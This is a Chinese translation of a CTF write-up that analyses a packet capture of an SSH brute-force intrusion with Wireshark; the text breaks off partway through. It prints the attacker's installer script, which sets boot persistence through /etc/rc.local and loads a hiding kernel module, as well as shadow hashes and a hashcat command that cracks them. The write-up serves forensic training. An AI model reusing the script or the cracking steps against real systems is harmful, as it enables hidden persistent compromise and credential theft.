<html>
<head>
<title>EscapeRoom — PCAP Analysis with Wireshark</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">密室——使用Wireshark进行PCAP分析</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/escaperoom-pcap-analysis-with-wireshark-ea7abcc68a18?source=collection_archive---------0-----------------------#2022-01-12">https://infosecwriteups.com/escaperoom-pcap-analysis-with-wireshark-ea7abcc68a18?source=collection_archive---------0-----------------------#2022-01-12</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><figure class="gl gn jo jp jq jr gh gi paragraph-image"><div class="gh gi jn"><img src="../Images/67155313f6368061648e60d4c0af0c6b.png" data-original-src="https://miro.medium.com/v2/resize:fit:616/format:webp/1*KtbHmgrQm42l6drSIMiEIA.jpeg"/></div><figcaption class="ju jv gj gh gi jw jx bd b be z dk translated"><a class="ae jy" href="https://mastermindescapegames.com/wp-content/themes/devsavvy/images/static/games-image.jpg" rel="noopener ugc nofollow" target="_blank">逃生室</a></figcaption></figure><p id="809e" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">这篇文章提供了我解决<em class="kx">在网络卫士网站上的蜜网项目</em>创建的<strong class="kb ir">逃脱室</strong> CTF的方法，这是一个蓝队专注的挑战，要求你对PCAP文件进行分析并回答一系列问题。我在最后提供了一个网络卫士网站的链接，供有兴趣尝试这项挑战的人使用。</p></div><div class="ab cl ky kz hu la" role="separator"><span class="lb bw bk lc ld le"/><span class="lb bw bk lc ld le"/><span class="lb bw bk lc ld"/></div><div class="ij ik il im in"><h1 id="28d3" class="lf lg iq bd lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc bi translated">放弃</h1><p id="b1bf" class="pw-post-body-paragraph jz ka iq kb b kc md ke kf kg me ki kj kk mf km kn ko mg kq kr ks mh ku kv kw ij bi translated">我喜欢在一篇文章之前添加一个简短的免责声明，以鼓励人们在阅读本文之前尝试CTF，因为在这篇文章中显然会有<strong class="kb ir">剧透</strong> <strong class="kb ir">。我相信，如果你先自己尝试，然后在遇到困难或需要提示时再来写这篇文章，你会更喜欢CTF。因此，没有任何进一步的拖延，让我们开始吧！</strong></p></div><div class="ab cl ky kz hu la" role="separator"><span class="lb bw bk lc ld le"/><span class="lb bw bk lc ld le"/><span class="lb bw bk lc ld"/></div><div class="ij ik il im in"><h1 id="74a8" class="lf lg iq bd lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc bi translated">挑战场景</h1><blockquote class="mi mj mk"><p id="ea13" class="jz ka kx kb b kc kd ke kf kg kh ki kj ml kl km kn mm kp kq kr mn kt ku kv kw ij bi translated">您属于一家专门通过基于KVM的虚拟机托管web应用程序的公司。周末，一台虚拟机宕机，站点管理员担心这可能是恶意活动的结果。他们从环境中提取了一些日志，希望您能够确定发生了什么。</p></blockquote></div><div class="ab cl ky kz hu la" role="separator"><span class="lb bw bk lc ld le"/><span class="lb bw bk lc ld le"/><span class="lb bw bk lc ld"/></div><div class="ij ik il im in"><h1 id="ece9" class="lf lg iq bd lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc bi translated">挑战问题</h1><blockquote class="mi mj mk"><p id="4187" class="jz ka kx kb b kc kd ke kf kg kh ki kj ml kl km kn mm kp kq kr mn kt ku kv kw ij bi translated">1.攻击者使用了什么服务来访问系统？</p></blockquote><p id="129e" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">我首先从CTF挑战赛提供的ZIP存档文件中提取了以下文件:</p><pre class="mo mp mq mr gt ms mt mu mv aw mw bi"><span id="7b78" class="mx lg iq mt b gy my mz l na nb">hp_challenge.pcap<br/>ps.log<br/>shadow.log<br/>sudoers.log</span></pre><p id="a2e6" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">接下来，我使用Wireshark打开PCAP文件，看到网络捕获文件中有<strong class="kb ir"> SSH </strong>流量:</p><figure class="mo mp mq mr gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="nd ne di nf bf ng"><div class="gh gi nc"><img src="../Images/7476a40d3294d65e871035321ece1b66.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*8XEv3_cbL0PX0vbfYxfs2A.png"/></div></div><figcaption class="ju jv gj gh gi jw jx bd b be z dk translated">SSH流量。</figcaption></figure><p id="4dcc" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">SSH协议(也称为安全Shell)是一种从一台计算机安全远程登录到另一台计算机的方法。导航到Wireshark中的“<em class="kx">统计数据&gt;协议层次结构</em>，我可以看到捕获中所有协议的树:</p><figure class="mo mp mq mr gt jr gh gi paragraph-image"><div class="gh gi nh"><img src="../Images/e13bf3ad999ab8788754ef999b536071.png" data-original-src="https://miro.medium.com/v2/resize:fit:984/format:webp/1*582n2xgy4p3aSUs4WvFgmw.png"/></div><figcaption class="ju jv gj gh gi jw jx bd b be z dk translated">Wireshark协议层次结构</figcaption></figure><p id="98de" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">我能看到的唯一其他协议是HTTP，这意味着SSH很可能是攻击者用来访问系统的服务。</p><blockquote class="mi mj mk"><p id="eec8" class="jz ka kx kb b kc kd ke kf kg kh ki kj ml kl km kn mm kp kq kr mn kt ku kv kw ij bi translated">2.使用了什么攻击类型来访问系统？(一个词)</p></blockquote><p id="50a6" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">为了回答这个问题，我从过滤SSH流量开始:</p><figure class="mo mp mq mr gt jr gh gi paragraph-image"><div class="gh gi ni"><img src="../Images/9b323dc4001da2b2ff4050ed21e5d79f.png" data-original-src="https://miro.medium.com/v2/resize:fit:456/format:webp/1*OuWiLmmBthouMmDtFDIK7g.png"/></div><figcaption class="ju jv gj gh gi jw jx bd b be z dk translated">SSH过滤器。</figcaption></figure><p id="1b01" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">该过滤器的初始输出显示了建立SSH会话的多次失败尝试:</p><figure class="mo mp mq mr gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="nd ne di nf bf ng"><div class="gh gi nj"><img src="../Images/63fe617b276049a8d866982402c99d97.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*OGTD093rjxhITaw0fy5FLw.png"/></div></div><figcaption class="ju jv gj gh gi jw jx bd b be z dk translated">SSH会话失败。</figcaption></figure><p id="0e50" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">上图显示了尝试建立SSH会话时发生的不同步骤。这些步骤简述如下:</p><ol class=""><li id="4d69" class="nk nl iq kb b kc kd kg kh kk nm ko nn ks no kw np nq nr ns bi translated">客户端和服务器<strong class="kb ir">协商SSH版本</strong> ( <em class="kx">即4号包&amp; 6号包</em>)。</li><li id="2387" class="nk nl iq kb b kc nt kg nu kk nv ko nw ks nx kw np nq nr ns bi translated">客户端和服务器<strong class="kb ir">交换公钥以生成密钥</strong>。然后，服务器发出一个“<em class="kx">新密钥</em>”消息，并等待客户端应答。(<em class="kx">即8、9、11、13、14和15号包</em>)。</li><li id="b3fd" class="nk nl iq kb b kc nt kg nu kk nv ko nw ks nx kw np nq nr ns bi translated">客户端<strong class="kb ir">确认服务器的<em class="kx">新密钥</em>消息</strong> ( <em class="kx">即第16号数据包</em>)</li><li id="060c" class="nk nl iq kb b kc nt kg nu kk nv ko nw ks nx kw np nq nr ns bi translated">然后，在SSH会话关闭之前，我们会看到几个加密的数据包(即数据包编号18、20、21和22 )。</li></ol><p id="9322" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">向下查看SSH流量，我们看到这个过程重复了多次，直到接近SSH过滤输出的末尾。在数据包编号<strong class="kb ir"> 1365 </strong>处，我们看到一个建立SSH会话的尝试，只是这次我们看到的加密数据包比之前的尝试多得多:</p><figure class="mo mp mq mr gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="nd ne di nf bf ng"><div class="gh gi ny"><img src="../Images/a50d5a76f63f1c75a2c882b60ed6073d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*OW3lTCL0aYNQsv6v5hwjug.png"/></div></div><figcaption class="ju jv gj gh gi jw jx bd b be z dk translated">成功的SSH会话。</figcaption></figure><p id="0697" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">这在数据包编号<strong class="kb ir"> 1415 </strong>处再次出现。这表明进行了两次成功的SSH身份验证尝试。我们还可以在Wireshark中导航到“<em class="kx">统计数据&gt;对话&gt; TCP选项卡</em>”，从最高到最低过滤字节:</p><figure class="mo mp mq mr gt jr gh gi paragraph-image"><div class="gh gi nz"><img src="../Images/0457547cfffb73d035b08948a752d31e.png" data-original-src="https://miro.medium.com/v2/resize:fit:978/format:webp/1*nXK-zplL3iSnSEaTLwY4lg.png"/></div><figcaption class="ju jv gj gh gi jw jx bd b be z dk translated">SSH蛮力猜测攻击。</figcaption></figure><p id="9789" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">请看上面的截图，用红色突出显示的对话显示了成功的SSH会话，而下面的对话显示了SSH <strong class="kb ir">暴力猜测攻击。可以根据从服务器(B)发送到客户端(A)的字节来区分它们，其中成功的认证尝试会导致比不成功的认证尝试发送更多的数据。通过参考下面的文章，您可以了解有关用于事件响应的SSH协议分析的更多信息:</strong></p><div class="oa ob gp gr oc od"><a href="https://resources.infosecinstitute.com/topic/network-traffic-analysis-for-ir-ssh-protocol-with-wireshark/" rel="noopener  ugc nofollow" target="_blank"><div class="oe ab fo"><div class="of ab og cl cj oh"><h2 class="bd ir gy z fp oi fr fs oj fu fw ip bi translated">基于Wireshark - Infosec资源的IR: SSH协议网络流量分析</h2><div class="ok l"><h3 class="bd b gy z fp oi fr fs oj fu fw dk translated">安全外壳(SSH)旨在允许对计算机进行机密且经过身份验证的远程访问。像远程登录一样…</h3></div><div class="ol l"><p class="bd b dl z fp oi fr fs oj fu fw dk translated">resources.infosecinstitute.com</p></div></div></div></a></div><blockquote class="mi mj mk"><p id="70bf" class="jz ka kx kb b kc kd ke kf kg kh ki kj ml kl km kn mm kp kq kr mn kt ku kv kw ij bi translated">3.攻击者可能使用什么工具来执行这次攻击？</p></blockquote><p id="2446" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">因为我们知道攻击者执行了SSH暴力攻击，所以我们可以执行快速的google搜索来确定可以使用什么工具来执行攻击。我的第二个热门搜索结果显示了一个名为hydra的工具，这就是答案:</p><figure class="mo mp mq mr gt jr gh gi paragraph-image"><div class="gh gi om"><img src="../Images/e05c0cdff273dc3fc27c95cf245ef0f5.png" data-original-src="https://miro.medium.com/v2/resize:fit:482/format:webp/1*3YYzKib0jSQpmBD44b-6jA.png"/></div><figcaption class="ju jv gj gh gi jw jx bd b be z dk translated">SSH暴力工具的谷歌搜索结果。</figcaption></figure><blockquote class="mi mj mk"><p id="c270" class="jz ka kx kb b kc kd ke kf kg kh ki kj ml kl km kn mm kp kq kr mn kt ku kv kw ij bi translated">4.有多少次失败的尝试？</p></blockquote><p id="1deb" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">为了确定失败尝试的次数，我确保我仍然在主Wireshark视图中过滤SSH流量。</p><figure class="mo mp mq mr gt jr gh gi paragraph-image"><div class="gh gi ni"><img src="../Images/9b323dc4001da2b2ff4050ed21e5d79f.png" data-original-src="https://miro.medium.com/v2/resize:fit:456/format:webp/1*OuWiLmmBthouMmDtFDIK7g.png"/></div><figcaption class="ju jv gj gh gi jw jx bd b be z dk translated">SSH过滤器。</figcaption></figure><p id="fdbc" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">接下来，我在Wireshark中导航到“<em class="kx">统计数据&gt;对话&gt; TCP标签</em>”。在“conversations”窗口的底部，有一个复选框选项，用于将我们看到的内容仅限于我们的显示过滤器(即SSH流量)。启用此选项后，我们只能在TCP选项卡下看到SSH流量:</p><figure class="mo mp mq mr gt jr gh gi paragraph-image"><div class="gh gi on"><img src="../Images/26d8fbd3f6be323b462fa92e9e4f93ed.png" data-original-src="https://miro.medium.com/v2/resize:fit:1018/format:webp/1*2XYxqu0qdLW80OLzhqlPaw.png"/></div><figcaption class="ju jv gj gh gi jw jx bd b be z dk translated">SSH对话</figcaption></figure><p id="354b" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">我们可以看到，总共有54次建立SSH会话的尝试，根据从服务器(B)发送到客户机(A)的字节数，只有两次成功。这意味着建立SSH会话的尝试失败了52次。</p><blockquote class="mi mj mk"><p id="298c" class="jz ka kx kb b kc kd ke kf kg kh ki kj ml kl km kn mm kp kq kr mn kt ku kv kw ij bi translated">5.使用了什么凭证(用户名:密码)来获得访问权限？参考shadow.log和sudoers.log。</p></blockquote><p id="390b" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">作为挑战的一部分，我们收到了一个<em class="kx"> shadow.log </em>和一个<em class="kx"> sudoers.log </em>文件。如果我们查看<em class="kx"> shadow.log </em>文件，我们可以看到10个6类密码散列(SHA-512)，包括它们的salt:</p><pre class="mo mp mq mr gt ms mt mu mv aw mw bi"><span id="c6bc" class="mx lg iq mt b gy my mz l na nb">ubuntu:$6$MOCeF0du$eCgZ9.I.hS5CDST1aQHozhLbBH6rAUj97vvW/22eaCynqLv/whZKM1freAN3n2XQiCWjDr0UFreVv0IAvI.fl0:15549:0:99999:7:::</span><span id="0d3f" class="mx lg iq mt b gy oo mz l na nb">guest:$6$SaltVal1$MNuCQofLmz9CSSVdNGkdj7gRvcHeRinIVP2ezH5Q17oGC23EdbyAwZ6uzaknESS0W0TkgVpyqzGYqJMdxXSSl/:15549:0:99999:7:::</span><span id="3819" class="mx lg iq mt b gy oo mz l na nb">gibson:$6$SaltVal3$ub1ejU/gJOqG1gKnGhSypMtVJouMJ9JmVOYgptXcL0HLSfA84ZH.uwngUpf5XiLp0hu/E2hVh.CLBp2U24Uac1:15549:0:99999:7:::</span><span id="657a" class="mx lg iq mt b gy oo mz l na nb">sean:$6$SaltVal4$rIpTjZrVyyX4Lz0/TMvx3FjUbRRMEgKJ2vnQwBgaoSWeLm/VZifQvBco8AnpVQWhNvMolnyY43X5/i5YK/TIw.:15549:0:99999:7:::</span><span id="584a" class="mx lg iq mt b gy oo mz l na nb">george:$6$SaltVal5$W3YtX9RKtQfqPWxg6/iaxwMYD8LFxP/zqvTsg5GNXi39ulbUSAR.lvjXHrpJdSISNAiWpb6kj2iNI6LlFWETC1:15549:0:99999:7:::</span><span id="fc43" class="mx lg iq mt b gy oo mz l na nb">roger:$6$SaltVal6$.1SaTeewycJ1oTmt/6yxAbEyezXhnOajmjP9KWhvNGhkOapy0CyGvEBSQyuL2.TbiEDAPhfoKgoHjbPjczvHH0:15549:0:99999:7:::</span><span id="d95d" class="mx lg iq mt b gy oo mz l na nb">timothy:$6$SaltVal7$B6dVnvXVmLuILd3oBeCjvjUAYnowMZ5IRm1k3xzKq/fo8MZV7rUMFU1hhzRvaw9.G6mPST8fL8R6cvWqppcpf.:15549:0:99999:7:::</span><span id="686c" class="mx lg iq mt b gy oo mz l na nb">pierce:$6$SaltVal8$IUEDzxEsUcki.khFF/HOfbSa6uswLDmEGAobvvbz.8MYy9UvtPo6DCZrpcbLa2Ma4AUj65mNCr7xPP0kVH0tT/:15549:0:99999:7:::</span><span id="eeb5" class="mx lg iq mt b gy oo mz l na nb">sterling:$6$SaltVal9$7oq808gj5Pm4vzJQ7rOWXHtUiJw.qfmEhcmqhGYWUr.r3n4/G5V12QWVaJq7DPura/ZEVPqEUUpMlYzv412Qb1:15549:0:99999:7:::</span><span id="4785" class="mx lg iq mt b gy oo mz l na nb">manager:$6$SaltVal2$ybuPu7Nmo9LKn0p0ozhFhFw2SS2cqkLsx8c5OEAWFkIJjtXBEJqxUQzLh900QMgFTGiw6YuFDueNAapfLKt0f1:15549:0:99999:7:::</span></pre><p id="4c62" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">我使用了一个名为<strong class="kb ir"> Hashcat </strong>的工具来破解这些哈希，我能够恢复两个密码:</p><pre class="mo mp mq mr gt ms mt mu mv aw mw bi"><span id="072d" class="mx lg iq mt b gy my mz l na nb">hashcat64.exe -m 1800 -a 0 hash.txt rockyou.txt -o cracked.txt</span><span id="7db7" class="mx lg iq mt b gy oo mz l na nb">manager:forgot<br/>sean:spectre</span></pre><blockquote class="mi mj mk"><p id="c6db" class="jz ka kx kb b kc kd ke kf kg kh ki kj ml kl km kn mm kp kq kr mn kt ku kv kw ij bi translated">6.可以用来获得访问权限的其他哪些凭据(用户名:密码)也具有SUDO权限？参考shadow.log和sudoers.log。</p></blockquote><p id="e61e" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">请参考问题5的解决方案。</p><blockquote class="mi mj mk"><p id="560b" class="jz ka kx kb b kc kd ke kf kg kh ki kj ml kl km kn mm kp kq kr mn kt ku kv kw ij bi translated">7.用于在系统上下载恶意文件的工具是什么？</p></blockquote><p id="655a" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">基于我们之前的发现，我们知道除了SSH之外，唯一存在的其他协议是HTTP。我过滤了HTTP流量，如下所示:</p><figure class="mo mp mq mr gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="nd ne di nf bf ng"><div class="gh gi op"><img src="../Images/6127f67a48ee97e97eab91fa111d4b18.png" data-original-src="https://miro.medium.com/v2/resize:fit:358/format:webp/1*Me8aUad7T5rEb7-Z-jdcOQ.png"/></div></div><figcaption class="ju jv gj gh gi jw jx bd b be z dk translated">HTTP过滤器。</figcaption></figure><p id="5a9a" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">我选择了第一个HTTP数据包，并跟踪它的HTTP流。如果我们仔细观察用红色突出显示的请求头，我们可以看到用户代理请求头的值为<strong class="kb ir"> wget </strong>，这是一个通过HTTP、HTTPS和FTP下载从web服务器检索内容的工具。</p><figure class="mo mp mq mr gt jr gh gi paragraph-image"><div class="gh gi oq"><img src="../Images/b252aacf42eb8f75d93694507e2f4656.png" data-original-src="https://miro.medium.com/v2/resize:fit:574/format:webp/1*eG9L-NvLncakxVbRnyi3XA.png"/></div><figcaption class="ju jv gj gh gi jw jx bd b be z dk translated">Wget用户代理。</figcaption></figure><blockquote class="mi mj mk"><p id="8e03" class="jz ka kx kb b kc kd ke kf kg kh ki kj ml kl km kn mm kp kq kr mn kt ku kv kw ij bi translated">8.攻击者下载多少文件来执行恶意软件安装？</p></blockquote><p id="fec2" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">为了回答这个问题，我在Wireshark中导航到“<em class="kx">文件&gt;导出对象&gt; HTTP </em>”。在这个窗口中，我可以看到名为<strong class="kb ir"> 1 </strong>、<strong class="kb ir"> 2 </strong>和<strong class="kb ir"> 3 </strong>的三个文件。还有多个带有base64编码文件名的BMP文件:</p><figure class="mo mp mq mr gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="nd ne di nf bf ng"><div class="gh gi or"><img src="../Images/6f6d9a2ebf30586dd89db5654400f388.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*BLlcqOyD4VoOYkI2w_cmNw.png"/></div></div><figcaption class="ju jv gj gh gi jw jx bd b be z dk translated">HTTP对象。</figcaption></figure><blockquote class="mi mj mk"><p id="50bb" class="jz ka kx kb b kc kd ke kf kg kh ki kj ml kl km kn mm kp kq kr mn kt ku kv kw ij bi translated">9.主要的恶意软件MD5哈希是什么？</p></blockquote><p id="4846" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">我可以导出所有三个文件，并将它们保存到我的本地机器上。查看每个文件，我可以看到前两个文件是ELF二进制文件，第三个文件是一个脚本:</p><pre class="mo mp mq mr gt ms mt mu mv aw mw bi"><span id="86d6" class="mx lg iq mt b gy my mz l na nb">$ file malware-1 malware-2 malware-3</span><span id="5d82" class="mx lg iq mt b gy oo mz l na nb"><strong class="mt ir">malware-1</strong>: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, no section header</span><span id="3376" class="mx lg iq mt b gy oo mz l na nb"><strong class="mt ir">malware-2</strong>: ELF 64-bit LSB relocatable, x86-64, version 1 (SYSV), BuildID[sha1]=21064e0e38e436aa28aecd2612f20205977b3826, with debug_info, not stripped</span><span id="5b52" class="mx lg iq mt b gy oo mz l na nb"><strong class="mt ir">malware-3</strong>: Bourne-Again shell script, ASCII text executable</span></pre><p id="c041" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">查看第三个文件(即恶意软件-3)的内容，我可以看到名为1的文件(即恶意软件-1)是主要的恶意软件文件:</p><pre class="mo mp mq mr gt ms mt mu mv aw mw bi"><span id="78c9" class="mx lg iq mt b gy my mz l na nb">#!/bin/bash</span><span id="f10a" class="mx lg iq mt b gy oo mz l na nb">mv <strong class="mt ir">1</strong> /var/mail/mail<br/>chmod +x /var/mail/mail<br/>echo -e "/var/mail/mail &amp;\nsleep 1\npidof mail &gt; /proc/dmesg\nexit 0" &gt; /etc/rc.local<br/>nohup /var/mail/mail &gt; /dev/null 2&gt;&amp;1&amp;<br/>mv 2 /lib/modules/`uname -r`/sysmod.ko<br/>depmod -a<br/>echo "sysmod" &gt;&gt; /etc/modules<br/>modprobe sysmod<br/>sleep 1<br/>pidof mail &gt; /proc/dmesg<br/>rm 3</span></pre><p id="1a1b" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">然后，我可以检查所有三个文件的MD5哈希，并获得主要恶意软件文件的哈希:</p><pre class="mo mp mq mr gt ms mt mu mv aw mw bi"><span id="0cc3" class="mx lg iq mt b gy my mz l na nb">$ md5sum malware-1 malware-2 malware-3</span><span id="5cc3" class="mx lg iq mt b gy oo mz l na nb"><strong class="mt ir">772b620736b760c1d736b1e6ba2f885b  malware-1</strong><br/>2f41df5a12a1f64e47dede21f1c47326  malware-2<br/>dadbb7fe0577d016bb825d3c59dc3715  malware-3</span></pre><blockquote class="mi mj mk"><p id="b9c6" class="jz ka kx kb b kc kd ke kf kg kh ki kj ml kl km kn mm kp kq kr mn kt ku kv kw ij bi translated">10.脚本修改了什么文件，恶意软件会在重启时启动？</p></blockquote><p id="9a92" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">如果我们参考前面看到的bash脚本的内容，我们可以注意到,<em class="kx"> echo </em>命令用于向“<strong class="kb ir"> /etc/rc.local </strong>”脚本添加一个新命令。</p><pre class="mo mp mq mr gt ms mt mu mv aw mw bi"><span id="c0ab" class="mx lg iq mt b gy my mz l na nb">echo -e "/var/mail/mail &amp;\nsleep 1\npidof mail &gt; /proc/dmesg\nexit 0" &gt; /etc/rc.local</span></pre><p id="80be" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">该脚本通常在所有正常系统服务启动后执行，在切换到多用户运行级别的过程结束时执行，并可用于启动定制服务。</p><blockquote class="mi mj mk"><p id="6738" class="jz ka kx kb b kc kd ke kf kg kh ki kj ml kl km kn mm kp kq kr mn kt ku kv kw ij bi translated">11.恶意软件将本地文件保存在哪里？</p></blockquote><p id="e286" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">同样，查看bash脚本的内容，我们可以看到恶意软件将本地文件存储在“/var/mail”文件夹中。</p><pre class="mo mp mq mr gt ms mt mu mv aw mw bi"><span id="43bc" class="mx lg iq mt b gy my mz l na nb">mv 1 /var/mail/mail</span></pre><blockquote class="mi mj mk"><p id="c968" class="jz ka kx kb b kc kd ke kf kg kh ki kj ml kl km kn mm kp kq kr mn kt ku kv kw ij bi translated">12.ps.log缺什么？</p></blockquote><p id="6a82" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">Linux为我们提供了一个名为<strong class="kb ir"> ps </strong> ( <strong class="kb ir">“进程状态”</strong>)的实用程序，用于查看系统上进程的相关信息，并用于列出当前正在运行的进程。根据我们在上面的bash脚本中看到的，我们应该会看到“<strong class="kb ir"> /var/mail/mail </strong>”进程正在运行，但是它似乎不在ps.log文件中。</p><blockquote class="mi mj mk"><p id="9bd4" class="jz ka kx kb b kc kd ke kf kg kh ki kj ml kl km kn mm kp kq kr mn kt ku kv kw ij bi translated">13.用于从ps.log中删除该信息的主文件是什么？</p></blockquote><p id="a489" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">查看bash shell脚本，我们可以看到文件名<strong class="kb ir"> 2 </strong>(即恶意软件-2)存储在“<em class="kx"> /etc/modules </em>”文件夹中，名为<strong class="kb ir"> sysmod.ko </strong>:</p><pre class="mo mp mq mr gt ms mt mu mv aw mw bi"><span id="6204" class="mx lg iq mt b gy my mz l na nb">mv 2 /lib/modules/`uname -r`/sysmod.ko<br/>depmod -a<br/>echo "sysmod" &gt;&gt; /etc/modules<br/>modprobe sysmod</span></pre><p id="933a" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">“<em class="kx"> /etc/modules </em>”文件包含要在引导时加载的内核模块的<strong class="kb ir">名称，每行一个。由于文件1(即恶意软件-1)是主要的恶意软件文件，文件3(即恶意软件-3)是外壳脚本，我们可以假设文件2(即恶意软件-2)用于从<em class="kx"> ps.log </em>文件中删除信息。</strong></p><blockquote class="mi mj mk"><p id="c7a3" class="jz ka kx kb b kc kd ke kf kg kh ki kj ml kl km kn mm kp kq kr mn kt ku kv kw ij bi translated">14.在Main函数中，向那些服务器发出请求的函数是什么？</p></blockquote><p id="c175" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">因为我们知道malware-1是主要的恶意软件文件，所以我首先使用strings实用程序来识别任何感兴趣的函数名，这些函数名将用于向托管恶意软件文件的服务器发出请求。在执行这个搜索时，我看到了字符串<strong class="kb ir"> UPX </strong>:</p><pre class="mo mp mq mr gt ms mt mu mv aw mw bi"><span id="b06d" class="mx lg iq mt b gy my mz l na nb"><strong class="mt ir">UPX!   </strong>                                                                                                                                                                    <br/>'<a class="ae jy" href="http://twitter.com/6" rel="noopener ugc nofollow" target="_blank">@6</a>!O                                                                                                                                                                      <br/>9,!O                                                                                                                                                                       <br/>7Q;l                                                                                                                                                                       <br/>/lib64<br/>nux-x86-<br/>so.2<br/>!Co&gt;C<br/>__gmon_start</span></pre><p id="3201" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">UPX(可执行文件的终极打包器)是一个开源的可执行打包器，在恶意软件领域很常见。我们可以使用下面的命令解压文件:</p><pre class="mo mp mq mr gt ms mt mu mv aw mw bi"><span id="2638" class="mx lg iq mt b gy my mz l na nb">upx -d malware-1</span></pre><p id="8bae" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">使用Strings实用程序，我可以看到许多有趣的函数名，包括名为<strong class="kb ir"> requestFile、</strong>的函数，我们可以假设它用于从服务器请求文件<strong class="kb ir"> </strong>:</p><figure class="mo mp mq mr gt jr gh gi paragraph-image"><div class="gh gi os"><img src="../Images/4dee8f047e17a1fc243f09806ebe548a.png" data-original-src="https://miro.medium.com/v2/resize:fit:486/format:webp/1*E0Hpvj-y-DeKneV1vLD9tQ.png"/></div><figcaption class="ju jv gj gh gi jw jx bd b be z dk translated">恶意软件功能。</figcaption></figure><blockquote class="mi mj mk"><p id="0999" class="jz ka kx kb b kc kd ke kf kg kh ki kj ml kl km kn mm kp kq kr mn kt ku kv kw ij bi 